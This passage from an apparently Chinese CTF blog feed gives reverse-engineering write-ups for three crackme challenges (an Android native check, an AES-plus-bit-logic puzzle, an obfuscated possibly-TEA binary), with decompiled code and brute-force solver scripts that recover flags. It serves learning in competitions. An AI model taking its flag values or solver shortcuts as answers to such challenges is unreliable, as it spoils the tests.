class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) MyService.class);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.nobody.Serv1ce.MainActivity.1</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            <span class="type">myclass</span> <span class="variable">myclassVar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">myclass</span>();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; mycall = myclassVar.mycall(myclassVar.decode(<span class="string">&quot;RtHTxaKcRXIdES5ktXugN2ww1d91EMp/QOxAh8bV&quot;</span>));</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> mycall.getMethod(myclassVar.decode(<span class="string">&quot;VMvWxbmmRC4IFyN1&quot;</span>), Intent.class);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">newInstance</span> <span class="operator">=</span> mycall.getConstructor(Context.class).newInstance(<span class="built_in">this</span>);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;input&quot;</span>, ((TextView) MainActivity.<span class="built_in">this</span>.findViewById(R.id.Input)).getText().toString());</span><br><span class="line">                method.invoke(newInstance, intent);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) MyService.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> mycall.getMethod(myclassVar.decode(<span class="string">&quot;VMvWxbmmRC4IFyN1&quot;</span>), Intent.class);</span><br><span class="line">method.invoke(newInstance, intent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明它用自己的service调用了startService</p><p>查看这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String str, <span class="type">byte</span>[] bArr, <span class="type">int</span> i)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>native函数</p><p>继续hook检查函数</p><p>得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bArr</span>=-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>, i=<span class="number">11</span></span><br></pre></td></tr></table></figure><p>得到最后检查值</p><p>然后看so文件，直接就有加密逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_nobody_Serv1ce_MyService_check</span><span class="params">(JNIEnv *a1, jclass *a2, <span class="type">void</span> *a3, <span class="type">void</span> *a4, <span class="type">char</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// x20</span></span><br><span class="line">  jbyte *v9; <span class="comment">// x21</span></span><br><span class="line">  __int64 v10; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// w10</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">4</span>]; <span class="comment">// [xsp+4h] [xbp-Ch] BYREF</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+8h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  v8 = (*a1)-&gt;GetStringUTFChars(a1, a3, v13);</span><br><span class="line">  v9 = (*a1)-&gt;GetByteArrayElements(a1, a4, v13);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v8) == <span class="number">36LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (v8[v10] ^ v9[v10]) * a5;</span><br><span class="line">      v8[v10] = v11;</span><br><span class="line">      <span class="keyword">if</span> ( v[v10] != v11 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v10 == <span class="number">36</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常明显，直接爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0xB9</span>, <span class="number">0x32</span>, <span class="number">0xC2</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0xD5</span>, <span class="number">0xCA</span>, <span class="number">0xFB</span>, <span class="number">0xF8</span>, <span class="number">0xFB</span>, <span class="number">0x80</span>, <span class="number">0x7C</span>, <span class="number">0xD4</span>, <span class="number">0xE5</span>, <span class="number">0x93</span>, <span class="number">0xD5</span>, <span class="number">0x1C</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xDF</span>, <span class="number">0xDA</span>, <span class="number">0xA1</span>, <span class="number">0x11</span>, <span class="number">0xF8</span>, <span class="number">0xA1</span>, <span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0xC2</span>, <span class="number">0x7C</span>, <span class="number">0x8B</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0xA3</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="comment"># print(len(last))</span></span><br><span class="line">key = [-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">30</span>,-<span class="number">83</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">30</span>,-<span class="number">59</span>,-<span class="number">59</span>,-<span class="number">83</span>,-<span class="number">30</span>,-<span class="number">27</span>,-<span class="number">59</span>]</span><br><span class="line">num = <span class="number">11</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> ((key[i]^ch)*num)&amp;<span class="number">0xff</span> == last[i]:</span><br><span class="line">            flag.append(ch)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">pl(flag)</span><br></pre></td></tr></table></figure><h2 id="baby-re">baby_re</h2><p>打开一看，第一个函数有很明显的AES特征，可以使用自己的值测试一下，发现确实是AES</p><p><img src="https://s2.loli.net/2024/11/01/1DbyM6Av5iL8sgJ.png" alt="image-20241101145041414"></p><p>第二段是一个将加密后每个输入切为bit，然后附上4位index值</p><p><img src="https://s2.loli.net/2024/11/01/EZNFhcsgR5AvHzY.png" alt="image-20241101144424639"></p><p>最后一段的检查函数是bit的一堆运算，本来想用z3，但是z3类型一直报错，然后一想发现只有8+4位，直接开爆</p><p><img src="https://s2.loli.net/2024/11/01/Gc5CqzRadITxtSo.png" alt="image-20241101145100006"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_combinations</span>(<span class="params">n</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">current:<span class="built_in">list</span>, length</span>):</span><br><span class="line">        <span class="keyword">if</span> length == n:</span><br><span class="line">            result.append(current[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        backtrack(current+[<span class="number">0</span>], length + <span class="number">1</span>)</span><br><span class="line">        backtrack(current+[<span class="number">1</span>], length + <span class="number">1</span>)</span><br><span class="line">    backtrack([], <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">datab = generate_combinations(<span class="number">8</span>)</span><br><span class="line">dataf = generate_combinations(<span class="number">4</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="comment"># print(datab)</span></span><br><span class="line"><span class="comment"># print(dataf)</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dataf)):</span><br><span class="line">    turn_choice = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(datab)):</span><br><span class="line">        data = datab[i] + dataf[j]</span><br><span class="line">        v1 = data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">7</span>] &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; data[<span class="number">3</span>] &amp; ((data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">9</span>] &amp; data[<span class="number">7</span>] &amp; data[<span class="number">5</span>] &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">10</span>] &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] &amp; data[<span class="number">1</span>] &amp; data[<span class="number">0</span>]) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>)</span><br><span class="line">        v2 = data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">7</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; (data[<span class="number">1</span>] &amp; data[<span class="number">0</span>]) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) | (data[<span class="number">10</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; data[<span class="number">8</span>] &amp; data[<span class="number">7</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; data[<span class="number">3</span>] &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; data[<span class="number">3</span>] &amp; data[<span class="number">2</span>] &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">5</span>] &amp; data[<span class="number">3</span>] &amp; data[<span class="number">2</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | (v1 | data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; data[<span class="number">6</span>] &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; data[<span class="number">3</span>] &amp; data[<span class="number">2</span>] &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>)) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>)</span><br><span class="line">        v3 = data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; data[<span class="number">6</span>] &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; (data[<span class="number">1</span>] &amp; data[<span class="number">0</span>]) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) | (data[<span class="number">10</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; data[<span class="number">6</span>] &amp; (data[<span class="number">4</span>] == <span class="number">0</span>) &amp; data[<span class="number">3</span>] &amp; ((data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">9</span>] &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; data[<span class="number">5</span>] &amp; ((data[<span class="number">4</span>] | data[<span class="number">3</span>] | data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; (data[<span class="number">8</span>] == <span class="number">0</span>) &amp; data[<span class="number">7</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">5</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">0</span>] &amp; (data[<span class="number">1</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">10</span>] == <span class="number">0</span>) | v2</span><br><span class="line">        <span class="keyword">if</span> ((data[<span class="number">10</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">9</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>) | data[<span class="number">11</span>] &amp; data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; (data[<span class="number">6</span>] == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; data[<span class="number">4</span>] &amp; (data[<span class="number">2</span>] == <span class="number">0</span>) &amp; data[<span class="number">1</span>] &amp; (data[<span class="number">0</span>] == <span class="number">0</span>) &amp; (data[<span class="number">3</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) | v3 | data[<span class="number">10</span>] &amp; data[<span class="number">9</span>] &amp; data[<span class="number">8</span>] &amp; data[<span class="number">6</span>] &amp; data[<span class="number">4</span>] &amp; ((data[<span class="number">3</span>] | data[<span class="number">2</span>] | data[<span class="number">1</span>] | data[<span class="number">0</span>]) == <span class="number">0</span>) &amp; (data[<span class="number">5</span>] == <span class="number">0</span>) &amp; (data[<span class="number">7</span>] == <span class="number">0</span>) &amp; (data[<span class="number">11</span>] == <span class="number">0</span>)) ):</span><br><span class="line">            turn_choice.append(data)</span><br><span class="line">    res.append(turn_choice)</span><br><span class="line">    <span class="comment"># print((turn_choice))</span></span><br><span class="line"></span><br><span class="line">fi = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> res:</span><br><span class="line">    qu = []</span><br><span class="line">    <span class="keyword">for</span> ie <span class="keyword">in</span> b:</span><br><span class="line">        t = ie[:<span class="number">8</span>]</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i)<span class="keyword">for</span> i <span class="keyword">in</span> t),<span class="number">2</span>)</span><br><span class="line">        qu.append(t)</span><br><span class="line">    fi.append(qu)</span><br><span class="line"><span class="comment"># for f in fi:</span></span><br><span class="line"><span class="comment">#     phex(f)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_com</span>(<span class="params">lists</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lists:</span><br><span class="line">        <span class="keyword">return</span> [[]]</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> lists[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">for</span> rest <span class="keyword">in</span> list_com(lists[<span class="number">1</span>:]):</span><br><span class="line">            result.append([item] + rest)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">reallylast = list_com(fi)</span><br><span class="line"><span class="built_in">print</span>(reallylast)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;3577402ECCA44A3F9AB72182F9B01F35&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">dec = [cipher.decrypt(<span class="built_in">bytes</span>(i)).<span class="built_in">hex</span>() <span class="keyword">for</span> i <span class="keyword">in</span> reallylast]</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">1</span>])</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4d87ef03-77bb-491a-80f5-4620245807c4</span></span><br><span class="line"><span class="string">0461d177-8471-23e0-dd55-0c471123c3f1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>最后有两个值，但是只有第一个是对的，不知道为什么。</p><h2 id="ez-re">ez_re</h2><p>这个题一打开人就傻了，全是花，我该怎么分析流程呢</p><p>那就硬调吧QAQ</p><p><img src="https://s2.loli.net/2024/11/01/FQd9oBjMCPXDHaL.png" alt="image-20241101153119187"></p><p>输入完之后步出，到这里，说明这之前在输入之前</p><p>然后转到data段开头，有一个56长度的数据，后面有一个0x12345678</p><p>猜测长度是56，对上面两个数据下断点，然后run</p><p>在某个地方断下来了（触发了0x12345678的断点），发现某个寄存器保存的输入被异或了</p><p>输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">11111111111111111111111111111111111111111111111111</span>&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x19</span>, <span class="number">0</span>x13, <span class="number">0</span>x1E, <span class="number">0</span>x18, <span class="number">0</span>x04, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, </span><br><span class="line"><span class="attribute">0x4E</span>, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, </span><br><span class="line"><span class="attribute">0x4E</span>, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, </span><br><span class="line"><span class="attribute">0x4E</span>, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x02</span><br></pre></td></tr></table></figure><p>继续往后调，7FF7FBA45F18位置发现RAX变成了9E3779B9，有可能是Tea</p><p>后面会发现它把eax的值放到栈里面，接着就是这一次的加密数据</p><p><img src="https://s2.loli.net/2024/11/01/ZexVLnO3dpksPht.png" alt="image-20241101193839970"></p><p>猜是个tea，然后不会了</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 混淆 </tag>
            
            <tag> re </tag>
            
            <tag> 安卓 </tag>
            
            <tag> AES </tag>
            
            <tag> 注册表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-青龙组-RE复现</title>
      <link href="/posts/5dbf475c.html"/>
      <url>/posts/5dbf475c.html</url>
      
